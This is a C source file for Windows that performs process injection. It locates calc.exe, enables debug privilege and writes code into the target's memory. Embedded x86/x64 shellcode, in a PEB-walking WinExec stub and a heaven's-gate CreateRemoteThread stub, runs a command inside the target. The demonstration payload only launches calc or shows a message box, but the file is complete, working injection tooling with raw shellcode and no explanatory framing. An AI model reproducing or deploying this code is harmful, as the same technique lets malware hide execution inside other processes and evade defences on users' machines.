
#include <windows.h>
#include <stdio.h>
#include <TlHelp32.h>  

#define CREATETHREADPIC_SIZE 271
char CREATETHREADPIC[] = {
  /* 0000 */ "\x53"                             /* push rbx                    */
  /* 0001 */ "\x56"                             /* push rsi                    */
  /* 0002 */ "\x57"                             /* push rdi                    */
  /* 0003 */ "\x55"                             /* push rbp                    */
  /* 0004 */ "\xe8\x6c\x00\x00\x00"             /* call 0x75                   */
  /* 0009 */ "\x85\xc0"                         /* test eax, eax               */
  /* 000B */ "\x74\x5d"                         /* jz 0x6a                     */
  /* 000D */ "\x48\x89\xe6"                     /* mov rsi, rsp                */
  /* 0010 */ "\x48\x83\xe4\xf0"                 /* and rsp, 0xfffffffffffffff0 */
  /* 0014 */ "\x48\x83\xec\x68"                 /* sub rsp, 0x68               */
  /* 0018 */ "\xb8\xfa\x80\x39\x5e"             /* mov eax, 0x5e3980fa         */
  /* 001D */ "\xe8\x78\x00\x00\x00"             /* call 0x9a                   */
  /* 0022 */ "\x48\x89\xc3"                     /* mov rbx, rax                */
  /* 0025 */ "\x4d\x31\xc0"                     /* xor r8, r8                  */
  /* 0028 */ "\x48\x31\xc0"                     /* xor rax, rax                */
  /* 002B */ "\x48\x89\x44\x24\x50"             /* mov [rsp+0x50], rax         */
  /* 0030 */ "\x48\x89\x44\x24\x48"             /* mov [rsp+0x48], rax         */
  /* 0035 */ "\x48\x89\x44\x24\x40"             /* mov [rsp+0x40], rax         */
  /* 003A */ "\x48\x89\x44\x24\x38"             /* mov [rsp+0x38], rax         */
  /* 003F */ "\x48\x89\x44\x24\x30"             /* mov [rsp+0x30], rax         */
  /* 0044 */ "\x8b\x46\x24"                     /* mov eax, [rsi+0x24]         */
  /* 0047 */ "\x48\x89\x44\x24\x28"             /* mov [rsp+0x28], rax         */
  /* 004C */ "\x8b\x46\x20"                     /* mov eax, [rsi+0x20]         */
  /* 004F */ "\x48\x89\x44\x24\x20"             /* mov [rsp+0x20], rax         */
  /* 0054 */ "\x44\x8b\x4e\x14"                 /* mov r9d, [rsi+0x14]         */
  /* 0058 */ "\xba\x00\x00\x00\x10"             /* mov edx, 0x10000000         */
  /* 005D */ "\x8b\x4e\x30"                     /* mov ecx, [rsi+0x30]         */
  /* 0060 */ "\xff\xd3"                         /* call rbx                    */
  /* 0062 */ "\x48\x89\xf4"                     /* mov rsp, rsi                */
  /* 0065 */ "\xe8\x18\x00\x00\x00"             /* call 0x82                   */
  /* 006A */ "\x5d"                             /* pop rbp                     */
  /* 006B */ "\x5f"                             /* pop rdi                     */
  /* 006C */ "\x5e"                             /* pop rsi                     */
  /* 006D */ "\x5b"                             /* pop rbx                     */
  /* 006E */ "\xc3"                             /* ret                         */
  /* 006F */ "\x31\xc0"                         /* xor eax, eax                */
  /* 0071 */ "\x48\xf7\xd8"                     /* neg rax                     */
  /* 0074 */ "\xc3"                             /* ret                         */
  /* 0075 */ "\xe8\xf5\xff\xff\xff"             /* call 0x6f                   */
  /* 007A */ "\x74\x05"                         /* jz 0x81                     */
  /* 007C */ "\x58"                             /* pop rax                     */
  /* 007D */ "\x6a\x33"                         /* push 0x33                   */
  /* 007F */ "\x50"                             /* push rax                    */
  /* 0080 */ "\xcb"                             /* retf                        */
  /* 0081 */ "\xc3"                             /* ret                         */
  /* 0082 */ "\xe8\xe8\xff\xff\xff"             /* call 0x6f                   */
  /* 0087 */ "\x75\x10"                         /* jnz 0x99                    */
  /* 0089 */ "\x58"                             /* pop rax                     */
  /* 008A */ "\x83\xec\x08"                     /* sub esp, 0x8                */
  /* 008D */ "\x89\x04\x24"                     /* mov [rsp], eax              */
  /* 0090 */ "\xc7\x44\x24\x04\x23\x00\x00\x00" /* mov dword [rsp+0x4], 0x23   */
  /* 0098 */ "\xcb"                             /* retf                        */
  /* 0099 */ "\xc3"                             /* ret                         */
  /* 009A */ "\x56"                             /* push rsi                    */
  /* 009B */ "\x57"                             /* push rdi                    */
  /* 009C */ "\x53"                             /* push rbx                    */
  /* 009D */ "\x51"                             /* push rcx                    */
  /* 009E */ "\x49\x89\xc0"                     /* mov r8, rax                 */
  /* 00A1 */ "\x6a\x60"                         /* push 0x60                   */
  /* 00A3 */ "\x5e"                             /* pop rsi                     */
  /* 00A4 */ "\x65\x48\x8b\x06"                 /* mov rax, [gs:rsi]           */
  /* 00A8 */ "\x48\x8b\x40\x18"                 /* mov rax, [rax+0x18]         */
  /* 00AC */ "\x4c\x8b\x50\x30"                 /* mov r10, [rax+0x30]         */
  /* 00B0 */ "\x49\x8b\x6a\x10"                 /* mov rbp, [r10+0x10]         */
  /* 00B4 */ "\x48\x85\xed"                     /* test rbp, rbp               */
  /* 00B7 */ "\x89\xe8"                         /* mov eax, ebp                */
  /* 00B9 */ "\x74\x4f"                         /* jz 0x10a                    */
  /* 00BB */ "\x4d\x8b\x12"                     /* mov r10, [r10]              */
  /* 00BE */ "\x8b\x45\x3c"                     /* mov eax, [rbp+0x3c]         */
  /* 00C1 */ "\x83\xc0\x10"                     /* add eax, 0x10               */
  /* 00C4 */ "\x8b\x44\x05\x78"                 /* mov eax, [rbp+rax+0x78]     */
  /* 00C8 */ "\x48\x8d\x74\x05\x18"             /* lea rsi, [rbp+rax+0x18]     */
  /* 00CD */ "\xad"                             /* lodsd                       */
  /* 00CE */ "\x91"                             /* xchg ecx, eax               */
  /* 00CF */ "\x67\xe3\xde"                     /* jecxz 0xb0                  */
  /* 00D2 */ "\xad"                             /* lodsd                       */
  /* 00D3 */ "\x4c\x8d\x5c\x05\x00"             /* lea r11, [rbp+rax]          */
  /* 00D8 */ "\xad"                             /* lodsd                       */
  /* 00D9 */ "\x48\x8d\x7c\x05\x00"             /* lea rdi, [rbp+rax]          */
  /* 00DE */ "\xad"                             /* lodsd                       */
  /* 00DF */ "\x48\x8d\x5c\x05\x00"             /* lea rbx, [rbp+rax]          */
  /* 00E4 */ "\x8b\x74\x8f\xfc"                 /* mov esi, [rdi+rcx*4-0x4]    */
  /* 00E8 */ "\x48\x01\xee"                     /* add rsi, rbp                */
  /* 00EB */ "\x31\xc0"                         /* xor eax, eax                */
  /* 00ED */ "\x99"                             /* cdq                         */
  /* 00EE */ "\xac"                             /* lodsb                       */
  /* 00EF */ "\x01\xc2"                         /* add edx, eax                */
  /* 00F1 */ "\xc1\xc2\x05"                     /* rol edx, 0x5                */
  /* 00F4 */ "\xff\xc8"                         /* dec eax                     */
  /* 00F6 */ "\x79\xf6"                         /* jns 0xee                    */
  /* 00F8 */ "\x44\x39\xc2"                     /* cmp edx, r8d                */
  /* 00FB */ "\xe0\xe7"                         /* loopne 0xe4                 */
  /* 00FD */ "\x75\xb1"                         /* jnz 0xb0                    */
  /* 00FF */ "\x0f\xb7\x14\x4b"                 /* movzx edx, word [rbx+rcx*2] */
  /* 0103 */ "\x41\x8b\x04\x93"                 /* mov eax, [r11+rdx*4]        */
  /* 0107 */ "\x48\x01\xe8"                     /* add rax, rbp                */
  /* 010A */ "\x59"                             /* pop rcx                     */
  /* 010B */ "\x5b"                             /* pop rbx                     */
  /* 010C */ "\x5f"                             /* pop rdi                     */
  /* 010D */ "\x5e"                             /* pop rsi                     */
  /* 010E */ "\xc3"                             /* ret                         */
};

#define EXECPIC_SIZE 123
char EXECPIC[] = {
  /* 0000 */ "\x53"                         /* push rbx                        */
  /* 0001 */ "\x56"                         /* push rsi                        */
  /* 0002 */ "\x57"                         /* push rdi                        */
  /* 0003 */ "\x55"                         /* push rbp                        */
  /* 0004 */ "\x83\xec\x28"                 /* sub esp, 0x28                   */
  /* 0007 */ "\x31\xc0"                     /* xor eax, eax                    */
  /* 0009 */ "\x40\x92"                     /* xchg edx, eax                   */
  /* 000B */ "\x74\x1a"                     /* jz 0x27                         */
  /* 000D */ "\x8b\x4c\x24\x3c"             /* mov ecx, [rsp+0x3c]             */
  /* 0011 */ "\x50"                         /* push rax                        */
  /* 0012 */ "\x51"                         /* push rcx                        */
  /* 0013 */ "\x64\x8b\x72\x2f"             /* mov esi, [fs:rdx+0x2f]          */
  /* 0017 */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001A */ "\x8b\x76\x0c"                 /* mov esi, [rsi+0xc]              */
  /* 001D */ "\xad"                         /* lodsd                           */
  /* 001E */ "\x8b\x30"                     /* mov esi, [rax]                  */
  /* 0020 */ "\x8b\x7e\x18"                 /* mov edi, [rsi+0x18]             */
  /* 0023 */ "\xb2\x50"                     /* mov dl, 0x50                    */
  /* 0025 */ "\xeb\x17"                     /* jmp 0x3e                        */
  /* 0027 */ "\xb2\x60"                     /* mov dl, 0x60                    */
  /* 0029 */ "\x65\x48\x8b\x32"             /* mov rsi, [gs:rdx]               */
  /* 002D */ "\x48\x8b\x76\x18"             /* mov rsi, [rsi+0x18]             */
  /* 0031 */ "\x48\x8b\x76\x10"             /* mov rsi, [rsi+0x10]             */
  /* 0035 */ "\x48\xad"                     /* lodsq                           */
  /* 0037 */ "\x48\x8b\x30"                 /* mov rsi, [rax]                  */
  /* 003A */ "\x48\x8b\x7e\x30"             /* mov rdi, [rsi+0x30]             */
  /* 003E */ "\x03\x57\x3c"                 /* add edx, [rdi+0x3c]             */
  /* 0041 */ "\x8b\x5c\x17\x28"             /* mov ebx, [rdi+rdx+0x28]         */
  /* 0045 */ "\x8b\x74\x1f\x20"             /* mov esi, [rdi+rbx+0x20]         */
  /* 0049 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 004C */ "\x8b\x54\x1f\x24"             /* mov edx, [rdi+rbx+0x24]         */
  /* 0050 */ "\x0f\xb7\x2c\x17"             /* movzx ebp, word [rdi+rdx]       */
  /* 0054 */ "\x48\x8d\x52\x02"             /* lea rdx, [rdx+0x2]              */
  /* 0058 */ "\xad"                         /* lodsd                           */
  /* 0059 */ "\x81\x3c\x07\x57\x69\x6e\x45" /* cmp dword [rdi+rax], 0x456e6957 */
  /* 0060 */ "\x75\xee"                     /* jnz 0x50                        */
  /* 0062 */ "\x8b\x74\x1f\x1c"             /* mov esi, [rdi+rbx+0x1c]         */
  /* 0066 */ "\x48\x01\xfe"                 /* add rsi, rdi                    */
  /* 0069 */ "\x8b\x34\xae"                 /* mov esi, [rsi+rbp*4]            */
  /* 006C */ "\x48\x01\xf7"                 /* add rdi, rsi                    */
  /* 006F */ "\x99"                         /* cdq                             */
  /* 0070 */ "\xff\xd7"                     /* call rdi                        */
  /* 0072 */ "\x48\x83\xc4\x28"             /* add rsp, 0x28                   */
  /* 0076 */ "\x5d"                         /* pop rbp                         */
  /* 0077 */ "\x5f"                         /* pop rdi                         */
  /* 0078 */ "\x5e"                         /* pop rsi                         */
  /* 0079 */ "\x5b"                         /* pop rbx                         */
  /* 007A */ "\xc3"                         /* ret                             */
};

typedef VOID (*pCreateRemoteThread64) (HANDLE hProcess, 
    LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter,
    DWORD dwCreationFlags, LPDWORD lpThreadId, LPHANDLE hThread);
typedef struct _RemoteParam {  
    char szMsg[12];    
    DWORD dwMessageBox;
} RemoteParam, * PRemoteParam;  
typedef int (__stdcall * PFN_MESSAGEBOX)(HWND, LPCTSTR, LPCTSTR, DWORD);  

BOOL IsWow64(HANDLE hProcess)
{
    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS) (HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process;
  
    BOOL bIsWow64 = FALSE;
    fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(
    GetModuleHandle("kernel32"),"IsWow64Process");

    if (NULL != fnIsWow64Process)
    {
        fnIsWow64Process(hProcess, &bIsWow64);  
    }
    return bIsWow64;
}

DWORD processNameToId(LPCTSTR lpszProcessName)  
{  
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);  
    PROCESSENTRY32 pe;  
    pe.dwSize = sizeof(PROCESSENTRY32);  
    if (!Process32First(hSnapshot, &pe)) {  
        MessageBox(NULL,"The frist entry of the process list has not been copyied to the buffer","Notice", MB_ICONINFORMATION | MB_OK);  
        return 0;  
    }  
    while (Process32Next(hSnapshot, &pe)) {  
        if (!strcmp(lpszProcessName, pe.szExeFile)) {  
            return pe.th32ProcessID;  
        }  
    }  
   
    return 0;  
}  

BOOL Is64BitOS()
{
    typedef VOID (WINAPI *LPFN_GetNativeSystemInfo)( __out LPSYSTEM_INFO lpSystemInfo );
    LPFN_GetNativeSystemInfo fnGetNativeSystemInfo = (LPFN_GetNativeSystemInfo)GetProcAddress( GetModuleHandle("kernel32"),"GetNativeSystemInfo");
    if(fnGetNativeSystemInfo)
    {
        SYSTEM_INFO stInfo = {0};
        fnGetNativeSystemInfo( &stInfo);
        if( stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_IA64
            || stInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        {
            return TRUE;
        }
    }
    return FALSE;
}

LPVOID init_func (char *asmcode, DWORD len)
{
    LPVOID sc=NULL;
    // allocate write/executable memory for code
    sc = VirtualAlloc (0, len, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (sc!=NULL) {
        // copy code
        memcpy (sc, asmcode, len);
    } else {
    MessageBox(NULL,"VirtualAlloc()","Notice", MB_ICONINFORMATION | MB_OK);  
    }
    return sc;
}

DWORD __stdcall threadProc(LPVOID lParam)  
{  
    RemoteParam* pRP = (RemoteParam*)lParam;  
    PFN_MESSAGEBOX pfnMessageBox;  
    pfnMessageBox = (PFN_MESSAGEBOX)pRP->dwMessageBox;  
    pfnMessageBox(NULL, pRP->szMsg, pRP->szMsg, 0);  
    return 0;  
}  

bool enableDebugPriv()  
{  
    HANDLE hToken;  
    LUID sedebugnameValue;  
    TOKEN_PRIVILEGES tkp;     
    if (!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {  
         return false;  
    }  
    if (!LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &sedebugnameValue)) {  
         CloseHandle(hToken);  
         return false;  
    }  
    tkp.PrivilegeCount = 1;  
    tkp.Privileges[0].Luid = sedebugnameValue;  
    tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;  
    if (!AdjustTokenPrivileges(hToken, FALSE, &tkp, sizeof(tkp), NULL, NULL)) {  
         CloseHandle(hToken);  
         return false;  
    }  
    return true;  
}  
  
void free_func (LPVOID func) {
    if (func!=NULL) {
         VirtualFree(func, 0, MEM_RELEASE);
    }
}

int main()
{
  
    BOOL           bWow64;  
    char *szExeName="calc.exe";  
    DWORD dwProcessId = processNameToId(szExeName);  
    if (dwProcessId == 0) {  
         MessageBox(NULL, "The target process have not been found !","Notice", MB_ICONINFORMATION | MB_OK);  
         return -1;  
    }  
    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcessId);     
    if (!hTargetProcess) {  
         MessageBox(NULL, "Open target process failed !","Notice", MB_ICONINFORMATION | MB_OK);  
         return 0;  
    }  
    bWow64 = IsWow64(hTargetProcess);
    if(bWow64||!Is64BitOS())
    {
      printf("32-bit process\n"); 
      const DWORD dwThreadSize = 4096;  
      DWORD dwWriteBytes;  
      enableDebugPriv();  
      void* pRemoteThread = VirtualAllocEx(hTargetProcess, 0,dwThreadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);  
      if (!pRemoteThread) {  
          MessageBox(NULL, "Alloc memory in target process failed !","notice", MB_ICONINFORMATION | MB_OK);  
          return 0;  
      }    
      if (!WriteProcessMemory(hTargetProcess,pRemoteThread, &threadProc, dwThreadSize, 0)) {  
          MessageBox(NULL, "Write data to target process failed !", "Notice", MB_ICONINFORMATION | MB_OK);  
          return 0;  
      }  
      RemoteParam remoteData;  
      ZeroMemory(&remoteData, sizeof(RemoteParam));  
   
      HINSTANCE hUser32 = LoadLibrary("User32.dll");  
      remoteData.dwMessageBox = (DWORD)GetProcAddress(hUser32, "MessageBoxA");  
      strcat_s(remoteData.szMsg, "Hello＼0");  
  
      RemoteParam* pRemoteParam = (RemoteParam*)VirtualAllocEx(  
      hTargetProcess , 0, sizeof(RemoteParam), MEM_COMMIT, PAGE_READWRITE);  
   
      if (!pRemoteParam) {  
          MessageBox(NULL, "Alloc memory failed !","Notice", MB_ICONINFORMATION | MB_OK);  
          return 0;  
      }  
      if (!WriteProcessMemory(hTargetProcess ,pRemoteParam, &remoteData, sizeof(remoteData), 0)) {  
          MessageBox(NULL, "Write data to target process failed !","Notice", MB_ICONINFORMATION | MB_OK);  
          return 0;  
      }  
   
      HANDLE hRemoteThread = CreateRemoteThread(  
      hTargetProcess, NULL, 0, (DWORD (__stdcall *)(void *))pRemoteThread,   
      pRemoteParam, 0, &dwWriteBytes);  
      if (!hRemoteThread) {  
          MessageBox(NULL, "Create remote thread failed !", "Notice",  MB_ICONINFORMATION | MB_OK);  
          return 0;  
      }  
      CloseHandle(hRemoteThread);  
      FreeLibrary(hUser32);  
    }
    else
    {
      printf("64-bit process\n");
      char *cmd="cmd /c start calc.exe";
      int CmdSize=strlen(cmd);

      HANDLE                hProc, hThread;
      BOOL                  bStatus=FALSE;
      LPVOID                pCode=NULL, pData=NULL;
      SIZE_T                written;
      DWORD                 idx, ec;
      pCreateRemoteThread64 CreateRemoteThread64=NULL;

      // try open the process
      printf("  [ opening process id %lu\n", dwProcessId);
      hProc = OpenProcess (PROCESS_ALL_ACCESS, FALSE, dwProcessId);
      if (hProc != NULL)
      {
          // allocate memory there
          printf("  [ allocating %lu bytes of XRW memory in process for code\n", EXECPIC_SIZE);
          pCode=VirtualAllocEx (hProc, 0, EXECPIC_SIZE, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          if (pCode != NULL)
          {
            // write the code
            printf("  [ writing %lu bytes of code to 0x%p\n", EXECPIC_SIZE, pCode);
            bStatus=WriteProcessMemory (hProc, pCode, EXECPIC, EXECPIC_SIZE, &written);
            if (bStatus) {
              if (cmd != NULL) {
                printf("  [ allocating %lu bytes of RW memory in process for parameter\n", CmdSize);
                pData=VirtualAllocEx (hProc, 0, CmdSize+1, MEM_COMMIT, PAGE_READWRITE);
              if (pData != NULL)
              {
                  printf("  [ writing %lu bytes of data to 0x%p\n", CmdSize, pData);
                  bStatus=WriteProcessMemory (hProc, pData, cmd, CmdSize, &written);
              if (!bStatus) {
                  printf ("  [ warning: unable to allocate write parameters to process...");
              }
            }
          }
          printf("  [ creating thread\n");
          hThread=NULL;
          CreateRemoteThread64=(pCreateRemoteThread64)
          init_func(CREATETHREADPIC, CREATETHREADPIC_SIZE);

          CreateRemoteThread64 (hProc, NULL, 0,(LPTHREAD_START_ROUTINE)pCode, pData, 0, 0, &hThread);

          if (hThread != NULL)
          {
            printf ("  [ waiting for thread %lx to terminate\n", (DWORD)hThread);
            idx=WaitForSingleObject (hThread, INFINITE);
            if (idx!=0) {
              MessageBox(NULL,"WaitForSingleObject","Notice", MB_ICONINFORMATION | MB_OK);                
            }
            ec=0;
            if (GetExitCodeThread(hThread, &ec)) {
              printf ("  [ exit code was %lu (%08lX)", ec, ec);
            }
            CloseHandle (hThread);
          } else {
            MessageBox(NULL,"CreateRemoteThread","Notice", MB_ICONINFORMATION | MB_OK);  
          }
          }
          if (idx==0) {
            VirtualFreeEx (hProc, pCode, 0, MEM_RELEASE);
          if (pData!=NULL) {
            VirtualFreeEx (hProc, pData, 0, MEM_RELEASE);
          }
          }
        } else {
          MessageBox(NULL,"VirtualFreeEx()","Notice", MB_ICONINFORMATION | MB_OK);  
      }
      CloseHandle (hProc);
    } else {
      MessageBox(NULL,"OpenProcess","Notice", MB_ICONINFORMATION | MB_OK);  
    }
    if (CreateRemoteThread64!=NULL) free_func(CreateRemoteThread64);
      return bStatus;
   }
}
